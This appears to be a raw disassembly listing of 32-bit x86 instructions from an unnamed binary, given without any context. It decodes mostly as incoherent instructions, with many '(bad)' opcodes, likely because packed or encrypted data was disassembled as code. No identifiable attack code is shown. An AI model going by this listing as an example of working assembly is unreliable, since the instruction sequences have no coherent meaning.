  4179e8:	(bad)
  4179eb:	fimul  WORD PTR [edi+0x33]
  4179ee:	cmovnp ebx,eax
  4179f1:	sub    BYTE PTR [ebx*1-0x413b12cf],cl
  4179f8:	(bad)  gs:[edx]
  4179fb:	fild   QWORD PTR [edx+eiz*8]
  4179fe:	scas   eax,DWORD PTR es:[edi]
  4179ff:	push   ebx
  417a00:	out    dx,al
  417a01:	push   ecx
  417a02:	xor    eax,edi
  417a04:	mov    DWORD PTR [ebp+0x10],edx
  417a07:	mov    edx,DWORD PTR [ebx]
  417a09:	jmp    0x417f93
  417a0e:	in     al,dx
  417a0f:	and    cl,BYTE PTR [esi-0x3d]
  417a12:	dec    eax
  417a13:	mov    ds:0xcc442870,eax
  417a18:	xor    BYTE PTR [edx-0x517f5d93],0x4
  417a1f:	jnp    0x417a2d
  417a21:	push   ss
  417a22:	cmp    eax,0x60161604
  417a27:	mov    DWORD PTR [esi+0x6f926337],eax
  417a2d:	test   eax,0xfd361f60
  417a32:	push   eax
  417a33:	jp     0x4179e9
  417a35:	pop    ds
  417a36:	fdivr  DWORD PTR [ecx+0x49]
  417a39:	cmp    edx,edi
  417a3b:	pop    ebx
  417a3c:	or     dh,al
  417a3e:	int    0x9b
  417a40:	mov    esi,0x93e09fd1
  417a45:	retf   0x1c54
  417a48:	xor    ecx,DWORD PTR [ebx]
  417a4a:	dec    ebx
  417a4b:	(bad)  
  417a4c:	sar    DWORD PTR [ebp+0x54fccd57],cl
  417a52:	(bad)  
  417a53:	ficomp DWORD PTR [esi+0x4cb80b]
  417a59:	dec    ebp
  417a5a:	sbb    DWORD PTR [eax+0x1d],edi
  417a5d:	push   ebx
  417a5e:	and    BYTE PTR [edi],0x7f
  417a61:	addr16 xchg ebp,eax
  417a63:	sub    al,cl
  417a65:	mov    ds:0x858df486,eax
  417a6a:	iret   
  417a6b:	lds    ebx,FWORD PTR [edx-0x2d99546f]
  417a71:	fstp   TBYTE PTR [edx+eiz*4+0x709a5cba]
  417a78:	into   
  417a79:	leave  
  417a7a:	jmp    0x5344:0xe7a84737
  417a81:	sub    BYTE PTR [edi+eax*2+0x4afd92e6],0x5b
  417a89:	into   
  417a8a:	xor    ecx,DWORD PTR [ecx+edi*2+0x7718f00e]
  417a91:	adc    BYTE PTR [esi+eax*2+0x223f9d82],dl
  417a98:	shr    BYTE PTR [esi+0x1b2b1872],1
  417a9e:	pop    es
  417a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa0:	adc    ecx,DWORD PTR [ebx+ebx*4]
  417aa3:	inc    ecx
  417aa4:	xchg   esp,eax
  417aa5:	clc    
  417aa6:	arpl   WORD PTR [ebx],di
  417aa8:	jbe    0x417add
  417aaa:	call   0xe008:0x141524e8
  417ab1:	and    dh,BYTE PTR ds:0x65bf0ead
  417ab7:	add    dh,BYTE PTR [ebp+0x677127e5]
  417abd:	arpl   WORD PTR [ecx+0x7c650c75],bx
  417ac3:	cmp    eax,0x532d5769
  417ac8:	or     BYTE PTR [bx+si+0x5e],0xc3
  417acd:	ret    
  417ace:	inc    edx
  417acf:	inc    edi
  417ad0:	inc    esp
  417ad1:	mov    ebx,0x80852ada
  417ad6:	imul   edx,eax,0xadd1cb83
  417adc:	adc    edi,DWORD PTR [eax+eiz*8-0x36]
  417ae0:	pop    sp
  417ae2:	cmc    
  417ae3:	pop    esp
  417ae4:	loopne 0x417a8b
  417ae6:	push   ebx
  417ae7:	dec    esi
  417ae8:	and    eax,0xcd97f921
  417aed:	das    
  417aee:	test   edx,ebx
  417af0:	ins    BYTE PTR es:[edi],dx
  417af1:	or     eax,ecx
  417af3:	jbe    0x417b6b
  417af5:	jmp    0xacf8ed23
  417afa:	ret    
  417afb:	lods   al,BYTE PTR ds:[esi]
  417afc:	icebp  
  417afd:	cmp    eax,0x362b7d43
  417b02:	lds    esp,FWORD PTR [edx+0x65]
  417b05:	scas   eax,DWORD PTR es:[edi]
  417b06:	test   al,0x90
  417b08:	mov    edi,0xfe3dc819
  417b0d:	or     BYTE PTR [ebx-0x6f],0x5e
  417b11:	or     eax,0x3d336046
  417b16:	mov    ch,0x73
  417b18:	sbb    bh,ah
  417b1a:	sub    eax,0xff8fd641
  417b1f:	cwde   
  417b20:	pop    ecx
  417b21:	int    0xd7
  417b23:	adc    eax,DWORD PTR es:[ebx-0x57e2961b]
  417b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b2b:	xor    ebx,DWORD PTR ss:[ecx-0x211fe584]
  417b32:	xor    BYTE PTR [ebp-0x62f40099],al
  417b38:	aas    
  417b39:	and    al,0x79
  417b3b:	shr    DWORD PTR [ecx],cl
  417b3d:	xchg   edx,eax
  417b3e:	fst    st(1)
  417b40:	sbb    DWORD PTR [ebx-0x9300cd8],esi
  417b46:	hlt    
  417b47:	xchg   ecx,eax
  417b48:	cdq    
  417b49:	dec    ebx
  417b4a:	inc    ebx
  417b4b:	pushf  
  417b4c:	mov    BYTE PTR [ebx-0x79],al
  417b4f:	pop    edi
  417b50:	xor    bl,dh
  417b52:	mov    bl,0x3f
  417b54:	xchg   BYTE PTR ds:0x96e8e8b,al
  417b5a:	xor    esp,DWORD PTR [edx+0x57f5a2a6]
  417b60:	pop    ss
  417b61:	fsubr  QWORD PTR [ecx]
  417b63:	into   
  417b64:	(bad)  
  417b65:	sub    edi,DWORD PTR [esi+0x64]
  417b68:	rcr    DWORD PTR [ecx],cl
  417b6a:	dec    edx
  417b6b:	or     eax,0x73c01251
  417b70:	adc    DWORD PTR [eax],edi
  417b72:	jbe    0x417bf3
  417b74:	jl     0x417bf1
  417b76:	mov    esi,0xee4c180
  417b7b:	(bad)  
  417b7c:	jg     0x417bfa
  417b7e:	dec    edx
  417b7f:	cwde   
  417b80:	clc    
  417b81:	xchg   edi,eax
  417b82:	pop    eax
  417b83:	push   ecx
  417b84:	push   cs
  417b85:	sub    eax,0xc7ad6c75
  417b8a:	stc    
  417b8b:	adc    esp,DWORD PTR [ebx-0x9]
  417b8e:	sar    ecx,cl
  417b90:	mov    ah,0xbe
  417b92:	test   DWORD PTR ds:0x30d6c6a4,edx
  417b98:	inc    esi
  417b99:	(bad)  
  417b9a:	jmp    0x8bd2eaee
  417b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ba0:	xchg   BYTE PTR [esi-0x1f],ch
  417ba3:	xor    DWORD PTR [edi-0x7e344f82],edx
  417ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417baa:	lahf   
  417bab:	cmp    al,0x5d
  417bad:	adc    DWORD PTR ds:0xf1257ccf,edi
  417bb3:	and    al,0x5e
  417bb5:	inc    edx
  417bb6:	(bad)  
  417bb7:	call   0x16a46ab6
  417bbc:	(bad)  
  417bbd:	mov    dh,0xec
  417bbf:	imul   edx,DWORD PTR [di+0x562c],0xffffffc7
  417bc5:	in     eax,0x3e
  417bc7:	cmc    
  417bc8:	xchg   ebp,eax
  417bc9:	xchg   edx,eax
  417bca:	push   ecx
  417bcb:	or     BYTE PTR [edx],bh
  417bcd:	out    dx,al
  417bce:	lds    esp,FWORD PTR [edi]
  417bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd1:	inc    esi
  417bd2:	ret    0xba95
  417bd5:	loopne 0x417bb1
  417bd7:	pusha  
  417bd8:	sub    DWORD PTR [eax],ecx
  417bda:	xchg   esi,eax
  417bdb:	add    al,0xe7
  417bdd:	add    BYTE PTR [edx+0x6051f2fe],cl
  417be3:	ret    0xab1e
  417be6:	pop    esi
  417be7:	jbe    0x417c51
  417be9:	ja     0x417c66
  417beb:	cli    
  417bec:	(bad)
  417bef:	pop    ds
  417bf0:	add    eax,DWORD PTR [eax]
  417bf2:	mov    ch,0xb
  417bf4:	vunpckhps xmm7,xmm4,XMMWORD PTR [ebx]
  417bf8:	nop
  417bf9:	jge    0x417c2d
  417bfb:	sahf   
  417bfc:	pop    edx
  417bfd:	enter  0xf79d,0x59
  417c01:	dec    edi
  417c02:	xor    DWORD PTR [edi-0x43],esp
  417c05:	jns    0x417c24
  417c07:	jo     0x417c4f
  417c09:	pop    esi
  417c0a:	push   esp
  417c0b:	xor    dl,BYTE PTR [edi-0x4b46b6d]
  417c11:	int    0x7f
  417c13:	and    al,BYTE PTR [ebx-0x6262f760]
  417c19:	inc    edx
  417c1a:	pop    eax
  417c1b:	inc    ecx
  417c1c:	aas    
  417c1d:	or     dl,bh
  417c1f:	fild   QWORD PTR [eax]
  417c21:	add    ch,BYTE PTR [edx+0xc]
  417c24:	repnz and ch,cl
  417c27:	test   al,0x27
  417c29:	mov    edi,0x4b5ff516
  417c2e:	adc    DWORD PTR [esi-0x4f],ecx
  417c31:	clc    
  417c32:	jg     0x417c57
  417c34:	add    al,ah
  417c36:	repnz mov bl,0xd2
  417c39:	cwde   
  417c3a:	push   ebx
  417c3b:	(bad)  
  417c3c:	xchg   esi,eax
  417c3d:	arpl   WORD PTR [ecx+0x3599083b],ax
  417c43:	ficomp WORD PTR [eax-0x2e1aca2f]
  417c49:	xchg   ebx,eax
  417c4a:	fadd   st,st(2)
  417c4c:	or     DWORD PTR [eax-0x1b],0xf6f6e7c
  417c53:	std    
  417c54:	mov    cl,dl
  417c56:	in     eax,dx
  417c57:	shl    bh,1
  417c59:	(bad)  
  417c5a:	aad    0x7b
  417c5c:	mov    esp,0x4c6c1eb4
  417c61:	stos   DWORD PTR es:[edi],eax
  417c62:	jg     0x417c8c
  417c64:	jns    0x417c34
  417c66:	ficomp DWORD PTR [ebx+0x52]
  417c69:	retf   0x5255
  417c6c:	retf   0x3e75
  417c6f:	or     DWORD PTR [ebx-0x4f],esi
  417c72:	jle    0x417c21
  417c74:	mov    ebx,0xadb956a9
  417c79:	imul   ecx,DWORD PTR [ebx],0x78e4364a
  417c7f:	xchg   ecx,eax
  417c80:	out    dx,eax
  417c81:	loop   0x417c1a
  417c83:	cs push 0x8c77c851
  417c89:	test   BYTE PTR [edi-0x3fe96df3],cl
  417c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c90:	mov    esi,0x3e5e54d7
  417c95:	and    DWORD PTR [eax],eax
  417c97:	lea    ebp,[ebx+0x3931416]
  417c9d:	fisttp WORD PTR [edx+ebp*8-0x6]
  417ca1:	mov    cl,BYTE PTR [edi+eiz*8-0xf71a1a6]
  417ca8:	test   bl,bl
  417caa:	sbb    dl,BYTE PTR [esi+eiz*8-0x14]
  417cae:	dec    edi
  417caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cb0:	rol    DWORD PTR [ecx-0x3],cl
  417cb3:	xor    bl,BYTE PTR [ebx-0x55d5bb01]
  417cb9:	xor    al,0x2b
  417cbb:	sbb    bh,BYTE PTR [edi-0x207f9055]
  417cc1:	push   cs
  417cc2:	(bad)  
  417cc3:	mov    eax,ds:0x17b89c8a
  417cc8:	lds    ecx,FWORD PTR [esi+ecx*2]
  417ccb:	adc    DWORD PTR ds:0xca277d68,ecx
  417cd1:	hlt    
  417cd2:	add    BYTE PTR [eax],ah
  417cd4:	jp     0x417c97
  417cd6:	out    0xa,al
  417cd8:	and    BYTE PTR [ebx+0x3187e5b9],ch
  417cde:	pop    ecx
  417cdf:	adc    ah,BYTE PTR [ebx]
  417ce1:	cdq    
  417ce2:	icebp  
  417ce3:	fisttp WORD PTR [edi]
  417ce5:	mov    bh,0xdf
  417ce7:	mov    al,ds:0xa8fdc576
  417cec:	pop    esp
  417ced:	adc    eax,0xf9b381e
  417cf2:	adc    ch,BYTE PTR [ebp+0x25e60291]
  417cf8:	mov    dh,0x7a
  417cfa:	jo     0x417d6d
  417cfc:	sti    
  417cfd:	mov    esp,0x2526efe2
  417d02:	add    bh,dh
  417d04:	int    0x2
  417d06:	hlt    
  417d07:	and    al,0x8f
  417d09:	popf   
  417d0a:	mov    es,WORD PTR [edi]
  417d0c:	cmp    ebp,ecx
  417d0e:	push   es
  417d0f:	(bad)  
  417d10:	repnz lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d13:	dec    eax
  417d14:	ror    BYTE PTR [ebp+0x2d],1
  417d17:	das    
  417d18:	dec    ecx
  417d19:	fsub   st(1),st
  417d1b:	xchg   ecx,eax
  417d1c:	rcl    DWORD PTR [edx+0x47],0x4b
  417d20:	je     0x417d6c
  417d22:	imul   edx,DWORD PTR [ebx+esi*1+0x5c],0x3c
  417d27:	imul   edi,eax,0x489866fe
  417d2d:	mov    bh,BYTE PTR [ebp-0x2f]
  417d30:	inc    edx
  417d31:	stos   BYTE PTR es:[edi],al
  417d32:	push   eax
  417d33:	cmp    al,0x86
  417d35:	ror    BYTE PTR [ecx+0x3f],0xfc
  417d39:	ins    DWORD PTR es:[edi],dx
  417d3a:	lock psrlq mm1,QWORD PTR [edi]
  417d3e:	lock add BYTE PTR [edi+0x341f8fed],dh
  417d45:	pop    edx
  417d46:	push   ecx
  417d47:	mov    esp,es
  417d49:	or     edi,ebx
  417d4b:	bound  esp,QWORD PTR [esp+edx*8]
  417d4e:	cwde   
  417d4f:	shr    BYTE PTR [eax-0x5d],cl
  417d52:	add    eax,0xad545364
  417d57:	retf   0x9746
  417d5a:	sub    DWORD PTR [ecx-0x15446026],0x50
  417d61:	or     BYTE PTR [ecx-0x4fa2e818],cl
  417d67:	jmp    0x417d31
  417d69:	xchg   ebx,eax
  417d6a:	adc    al,0xce
  417d6c:	hlt    
  417d6d:	mov    edx,0xf44b8044
  417d72:	xor    eax,0x70b61fbc
  417d77:	stos   DWORD PTR es:[edi],eax
  417d78:	push   ebp
  417d79:	add    BYTE PTR [edx+edi*2-0x4e],0xb1
  417d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d7f:	push   es
  417d80:	std    
  417d81:	call   0x6fd21539
  417d86:	(bad)  [ebp+0x27]
  417d89:	xchg   esi,eax
  417d8a:	or     dl,BYTE PTR [ebp+0x2686b31b]
  417d90:	ins    DWORD PTR es:[edi],dx
  417d91:	push   edx
  417d92:	lods   eax,DWORD PTR ds:[esi]
  417d93:	(bad)  
  417d94:	jp     0x417d86
  417d96:	sahf   
  417d97:	dec    ebx
  417d98:	mov    esi,0x16d48e6f
  417d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d9e:	cmc    
  417d9f:	adc    cl,bl
  417da1:	lods   eax,DWORD PTR ds:[esi]
  417da2:	sahf   
  417da3:	jge    0x417d6c
  417da5:	xor    al,0x8c
  417da7:	sbb    ch,BYTE PTR [ebp-0xb1df43d]
  417dad:	sbb    ah,BYTE PTR [ebx+ebp*1]
  417db0:	(bad)  
  417db2:	call   0xda830830
  417db7:	ret    0x5df2
  417dba:	cmp    al,0xc2
  417dbc:	mov    bh,0xe5
  417dbe:	sub    eax,0x65e88c4c
  417dc3:	mov    ah,0x8f
  417dc5:	dec    eax
  417dc6:	aad    0x23
  417dc8:	xor    bl,BYTE PTR [edi-0x1c]
  417dcb:	xchg   edx,eax
  417dcc:	stos   DWORD PTR es:[edi],eax
  417dcd:	scas   eax,DWORD PTR es:[edi]
  417dce:	(bad)  
  417dd0:	mov    ebp,0x545db0d0
  417dd5:	rol    eax,cl
  417dd7:	cmp    cl,dl
  417dd9:	jl     0x417e44
  417ddb:	pop    edi
  417ddc:	or     dl,BYTE PTR [ecx-0x2a89aab7]
  417de2:	dec    edx
  417de3:	xor    BYTE PTR [ecx+0x90fd38c],al
  417de9:	mov    bl,0xcf
  417deb:	int3   
  417dec:	mov    ebp,0x7ba2cd82
  417df1:	adc    al,0x5e
  417df3:	jmp    0x417d9e
  417df5:	inc    edi
  417df6:	lods   eax,DWORD PTR ds:[esi]
  417df7:	mov    ah,0xa2
  417df9:	mov    ebx,0x2bf0f27c
  417dfe:	(bad)  
  417dff:	or     al,0x12
  417e01:	das    
  417e02:	sub    ecx,DWORD PTR [ecx+0x65]
  417e05:	inc    eax
  417e06:	(bad)  [edi+0x1df4dd87]
  417e0c:	dec    edi
  417e0d:	(bad)  
  417e0e:	mov    eax,0x2a413d05
  417e13:	mov    esp,DWORD PTR [ebp-0x6d2d468b]
  417e19:	test   al,0xe5
  417e1b:	arpl   di,si
  417e1d:	imul   BYTE PTR [esi-0x5a]
  417e20:	popa   
  417e21:	dec    ebp
  417e22:	int    0xf0
  417e24:	repz and edx,DWORD PTR [ecx+0x27]
  417e28:	cmc    
  417e29:	cmp    esi,esi
  417e2b:	inc    ebx
  417e2c:	mov    ds:0x4cd92315,eax
  417e31:	or     DWORD PTR [ebx+eiz*8],ecx
  417e34:	ss stc 
  417e36:	stos   BYTE PTR es:[edi],al
  417e37:	mov    cl,0x5f
  417e39:	lahf   
  417e3a:	xor    al,BYTE PTR [ecx-0x1b]
  417e3d:	ss cdq 
  417e3f:	sbb    eax,0x48bc49a8
  417e44:	ret    
  417e45:	(bad)  
  417e46:	mov    eax,DWORD PTR [esi*8-0x4cb43ea1]
  417e4d:	repnz xchg esp,eax
  417e4f:	out    dx,eax
  417e50:	add    eax,0xb83aeab9
  417e55:	hlt    
  417e56:	(bad)  
  417e57:	ins    DWORD PTR es:[edi],dx
  417e58:	mov    ecx,0x7385e97f
  417e5d:	cmc    
  417e5e:	mov    dh,0x31
  417e60:	and    DWORD PTR [esi],edx
  417e62:	cmp    al,0x47
  417e64:	xchg   esp,eax
  417e65:	stos   BYTE PTR es:[edi],al
  417e66:	jle    0x417ebd
  417e68:	xor    eax,0x308c01cc
  417e6d:	addr16 xor al,0x79
  417e70:	dec    edx
  417e71:	jns    0x417e0b
  417e73:	mov    BYTE PTR [esi+0x26],ah
  417e76:	scas   eax,DWORD PTR es:[edi]
  417e77:	or     al,0x9
  417e79:	in     eax,0x12
  417e7b:	push   es
  417e7c:	add    BYTE PTR [eax+0x4904b5f],ah
  417e82:	out    0xaf,eax
  417e84:	test   dh,ch
  417e86:	add    DWORD PTR [edx+edx*1+0xb],0x49
  417e8b:	inc    ebx
  417e8c:	into   
  417e8d:	sbb    DWORD PTR [esi-0x29],eax
  417e90:	mov    ds:0xf0de7b63,eax
  417e95:	retf   
  417e96:	aas    
  417e97:	iret   
  417e98:	sub    DWORD PTR [edi-0x2b],ecx
  417e9b:	add    eax,DWORD PTR [esi+0x4a300cf]
  417ea1:	push   ebp
  417ea2:	mov    ch,0x6e
  417ea4:	hlt    
  417ea5:	jns    0x417ece
  417ea7:	jbe    0x417f25
  417ea9:	aas    
  417eaa:	popa   
  417eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eac:	cmp    al,0x58
  417eae:	and    al,0x31
  417eb0:	cmc    
  417eb1:	cmp    al,0xa6
  417eb3:	dec    ecx
  417eb4:	outs   dx,DWORD PTR ds:[esi]
  417eb5:	fld    QWORD PTR [esi]
  417eb7:	mov    cl,0x75
  417eb9:	int3   
  417eba:	push   ss
  417ebb:	(bad)  
  417ebc:	jo     0x417e9e
  417ebe:	adc    DWORD PTR [edx+0x63e3c8f4],0xb3d09408
  417ec8:	push   es
  417ec9:	in     eax,dx
  417eca:	mul    BYTE PTR [edi+ebx*1-0x5f774a26]
  417ed1:	cld    
  417ed2:	repnz add cl,BYTE PTR [edi+0x3c]
  417ed6:	pop    ss
  417ed7:	enter  0x9281,0x8d
  417edb:	xor    BYTE PTR [eax],bl
  417edd:	inc    ecx
  417ede:	lahf   
  417edf:	mov    edx,0x89910aab
  417ee4:	push   0xe2d66d4e
  417ee9:	or     al,0x69
  417eeb:	mov    esi,0x27d81d9f
  417ef0:	fsub   st(1),st
  417ef2:	out    0x1f,eax
  417ef4:	int3   
  417ef5:	or     cl,BYTE PTR [ecx+0xb]
  417ef8:	xor    eax,0xa3f1a1d2
  417efd:	mov    bl,0xd1
  417eff:	sbb    eax,DWORD PTR [ecx-0x79]
  417f02:	imul   BYTE PTR [edx-0x44]
  417f05:	cmp    ebx,DWORD PTR [ebx+ebx*1]
  417f08:	push   esp
  417f09:	test   BYTE PTR ds:0xb8f55f32,dl
  417f0f:	lahf   
  417f10:	or     DWORD PTR [eax],ecx
  417f12:	pop    edx
  417f13:	mov    bl,0xd5
  417f15:	cmp    al,0x9
  417f17:	rol    edx,cl
  417f19:	ins    BYTE PTR es:[edi],dx
  417f1a:	fstp   TBYTE PTR [ebx+0x3c44eca3]
  417f20:	pop    edx
  417f21:	pop    ecx
  417f22:	mov    eax,0xc257e603
  417f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f29:	push   eax
  417f2a:	xchg   edi,eax
  417f2b:	sbb    BYTE PTR [edi],al
  417f2d:	sti    
  417f2e:	inc    edx
  417f2f:	xor    BYTE PTR [esi+esi*2-0x1d],dl
  417f33:	mov    bl,dh
  417f35:	cs inc ebx
  417f37:	dec    edi
  417f38:	aaa    
  417f39:	(bad)  
  417f3a:	stc    
  417f3b:	imul   esp,DWORD PTR [edx],0xccfa7c3
  417f41:	pop    ebx
  417f42:	nop
  417f43:	out    0x7b,al
  417f45:	xlat   BYTE PTR ds:[ebx]
  417f46:	mov    bh,0x81
  417f48:	call   0x3349853e
  417f4d:	imul   ebx,edi,0x331be32f
  417f53:	(bad)  
  417f54:	dec    edi
  417f55:	push   0xdfcc0a4
  417f5a:	sub    BYTE PTR [edi+edx*8+0x5659aa97],ah
  417f61:	(bad)  
  417f62:	adc    al,BYTE PTR [edi]
  417f64:	xor    eax,0x9cc54d73
  417f69:	pop    esp
  417f6a:	dec    edx
  417f6b:	nop
  417f6c:	(bad)  
  417f6d:	cmp    eax,0x32fd9537
  417f72:	xor    bl,dh
  417f74:	pop    ss
  417f75:	mov    cl,0x14
  417f77:	dec    ebp
  417f78:	jne    0x417f76
  417f7a:	push   0x910e1033
  417f7f:	or     BYTE PTR [ecx-0x7d91741d],ah
  417f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f86:	mov    bh,0xd1
  417f88:	push   ebp
  417f89:	adc    ah,dl
  417f8b:	scas   al,BYTE PTR es:[edi]
  417f8c:	outs   dx,BYTE PTR ds:[esi]
  417f8d:	jo     0x417ff1
  417f8f:	ds push ds
  417f91:	aaa    
  417f92:	(bad)  
  417f93:	mov    edi,DWORD PTR [ebx+0x4]
  417f96:	push   eax
  417f97:	push   edi
  417f98:	push   edx
  417f99:	call   0x41df90
  417f9e:	shld   edx,eax,0x2
  417fa2:	shl    eax,0x2
  417fa5:	jmp    0x41852f
  417faa:	lods   al,BYTE PTR ds:[esi]
  417fab:	jecxz  0x41802b
  417fad:	sar    BYTE PTR [eax],0x20
  417fb0:	sub    bl,dl
  417fb2:	hlt    
  417fb3:	gs push eax
  417fb5:	je     0x417f74
  417fb7:	retf   0x72b4
  417fba:	xor    edi,DWORD PTR [ecx+0xc]
  417fbd:	push   ss
  417fbe:	cmp    eax,0x9b161604
  417fc3:	jecxz  0x41803c
  417fc5:	fmul   QWORD PTR [edi+0x6d]
  417fc8:	push   ds
  417fc9:	test   eax,0x67f74fd4
  417fce:	push   eax
  417fcf:	adc    ebp,ebx
  417fd1:	imul   ebp,DWORD PTR [esi+0x7c],0xffffffc8
  417fd5:	out    0x57,al
  417fd7:	push   esp
  417fd8:	mov    ds,WORD PTR [edi]
  417fda:	push   edx
  417fdb:	mov    ?,WORD PTR [edx-0x51]
  417fde:	add    al,0x41
  417fe0:	mov    al,0xda
  417fe2:	mov    eax,0x5b0b4b4d
  417fe7:	push   0x44
  417fe9:	push   ecx
  417fea:	dec    esp
  417feb:	sbb    al,0x47
  417fed:	jge    0x418065
  417fef:	xchg   bh,bh
  417ff1:	jmp    0x418026
  417ff3:	js     0x41804c
  417ff5:	ins    BYTE PTR es:[edi],dx
  417ff6:	xor    BYTE PTR [edi+0x56ad6f6a],0x77
  417ffd:	and    al,0x66
  417fff:	inc    edi
  418000:	cmc    
  418001:	adc    BYTE PTR [edi+0x79c1d39a],0xb4
  418008:	xor    ah,BYTE PTR [edi+eiz*4+0x38681d03]
  41800f:	mov    ebp,0x7d31608b
  418014:	mov    bh,al
  418016:	xchg   ebp,eax
  418017:	call   0xca9eb420
  41801c:	retf   
  41801d:	pop    edx
  41801e:	mov    eax,?
  418020:	mov    bh,0xaf
  418022:	ss data16 adc al,0x1d
  418026:	or     al,0x6
  418028:	mov    DWORD PTR [eax-0x7c2da66c],ebx
  41802e:	adc    BYTE PTR [ecx+0x6c3bb6b3],ch
  418034:	jmp    0x315baa
  418039:	stos   DWORD PTR es:[edi],eax
  41803a:	fcom   DWORD PTR [ecx-0xf6d7d8]
  418040:	iret   
  418041:	jmp    0x4bfe2694
  418046:	cmc    
  418047:	jo     0x41804c
  418049:	inc    ecx
  41804a:	adc    al,0x94
  41804c:	mov    ds:0x7b927ceb,al
  418051:	cmp    al,0x2c
  418053:	and    al,0xc6
  418055:	or     bl,BYTE PTR [ebx+0x2e39fa38]
  41805b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805c:	fstp   st(4)
  41805e:	mov    al,gs:0xa71b75ac
  418064:	stos   DWORD PTR es:[edi],eax
  418065:	or     BYTE PTR [esp+eax*1],0x77
  418069:	ja     0x418035
  41806b:	push   eax
  41806c:	in     al,dx
  41806d:	and    al,0xc
  41806f:	shl    BYTE PTR [ecx],cl
  418071:	mov    ch,0xd0
  418073:	fnstcw WORD PTR [eax-0x69]
  418076:	push   es
  418077:	and    dh,ch
  418079:	mov    al,ds:0xf148e49f
  41807e:	lahf   
  41807f:	sub    edx,DWORD PTR [ebx+0x2fb5da19]
  418085:	xchg   ebp,eax
  418086:	and    WORD PTR [edi],dx
  418089:	stc    
  41808a:	dec    esi
  41808b:	test   al,0x9d
  41808d:	hlt    
  41808e:	mov    ah,ah
  418090:	outs   dx,BYTE PTR ds:[esi]
  418091:	outs   dx,BYTE PTR ds:[esi]
  418092:	leave  
  418093:	pop    ebp
  418094:	push   esp
  418095:	and    eax,0xca428353
  41809a:	xchg   ebx,eax
  41809b:	pushf  
  41809c:	mov    dl,BYTE PTR [ebp-0x6a]
  41809f:	mov    esp,0x38ad5931
  4180a4:	or     ecx,esp
  4180a6:	xchg   ecx,eax
  4180a7:	jno    0x418055
  4180a9:	dec    ecx
  4180aa:	ins    BYTE PTR es:[edi],dx
  4180ab:	dec    ebp
  4180ac:	mov    ss,WORD PTR [esi-0x65]
  4180af:	ret    0xea89
  4180b2:	nop
  4180b3:	fcom   st(3)
  4180b5:	(bad)  [ecx-0x20]
  4180b8:	push   ss
  4180b9:	add    esp,ecx
  4180bb:	rol    BYTE PTR [ebp+ebx*4+0x7cc7b600],cl
  4180c2:	push   esi
  4180c3:	mov    eax,ds:0x3201c6f0
  4180c8:	push   0xffffff8d
  4180ca:	inc    ebx
  4180cb:	shl    DWORD PTR [eax-0x10858935],1
  4180d1:	dec    ecx
  4180d2:	ins    BYTE PTR es:[edi],dx
  4180d3:	sbb    bh,al
  4180d5:	leave  
  4180d6:	xor    BYTE PTR [ebx],dl
  4180d8:	dec    ebx
  4180d9:	or     BYTE PTR [esp+esi*1+0x37],bh
  4180dd:	xor    DWORD PTR [edx-0x58],esp
  4180e0:	jecxz  0x4180cf
  4180e2:	mov    al,BYTE PTR [eax+0x4e7d0072]
  4180e8:	ins    BYTE PTR es:[edi],dx
  4180e9:	pop    edi
  4180ea:	jb     0x418147
  4180ec:	es push ds
  4180ee:	pop    ds
  4180ef:	jge    0x4180dd
  4180f1:	pop    eax
  4180f2:	test   ebx,ebp
  4180f4:	fsub   QWORD PTR [esi-0x6acd471a]
  4180fa:	add    BYTE PTR [ebx-0x5a],dh
  4180fd:	js     0x4180ce
  4180ff:	mov    al,BYTE PTR [edi-0x612d3406]
  418105:	(bad)  
  418106:	dec    esi
  418107:	jg     0x418156
  418109:	je     0x4180ce
  41810b:	pop    edx
  41810c:	mov    esp,0xfe296763
  418111:	loopne 0x418142
  418113:	pop    edi
  418114:	pushf  
  418115:	jno    0x418135
  418117:	or     ebx,DWORD PTR [ecx+0x2369822a]
  41811d:	(bad)  
  41811e:	jmp    0x41816f
  418120:	sahf   
  418121:	(bad)  
  418122:	int3   
  418123:	mov    edx,0xe938b226
  418128:	dec    esp
  418129:	sti    
  41812a:	ins    DWORD PTR es:[edi],dx
  41812b:	rol    DWORD PTR [ebp-0x28bff028],1
  418131:	ror    DWORD PTR [eax],cl
  418133:	adc    eax,0x2a540787
  418138:	dec    esi
  418139:	mov    ds:0x64a45840,al
  41813e:	test   al,0x19
  418140:	retf   0x73e0
  418143:	mov    ebp,0x214f31fb
  418148:	pushf  
  418149:	or     BYTE PTR [edi+0x34],ch
  41814c:	mov    dl,0xa1
  41814e:	push   edi
  41814f:	push   ebp
  418150:	inc    edi
  418151:	lock xlat BYTE PTR ds:[ebx]
  418153:	hlt    
  418154:	das    
  418155:	mov    esi,0x3977543f
  41815a:	(bad)  
  41815b:	stos   DWORD PTR es:[edi],eax
  41815c:	cmp    DWORD PTR [eax+0x1a],esi
  41815f:	cmp    BYTE PTR [ebx-0x54],cl
  418162:	out    0x51,eax
  418164:	sbb    eax,0xa323beff
  418169:	call   0x5917:0xaad82268
  418170:	stc    
  418171:	aam    0x18
  418173:	fs bnd jo 0x4181c6
  418177:	ins    DWORD PTR es:[edi],dx
  418178:	lock stos DWORD PTR es:[edi],eax
  41817a:	aam    0x87
  41817c:	loop   0x418124
  41817e:	stos   DWORD PTR es:[edi],eax
  41817f:	lods   al,BYTE PTR ds:[esi]
  418180:	fsubr  DWORD PTR [ebp-0x373f8509]
  418186:	add    esp,DWORD PTR [edx+0x5d445141]
  41818c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41818e:	sub    edx,DWORD PTR [ebx+0x3b648d1d]
  418194:	mov    bh,0xbd
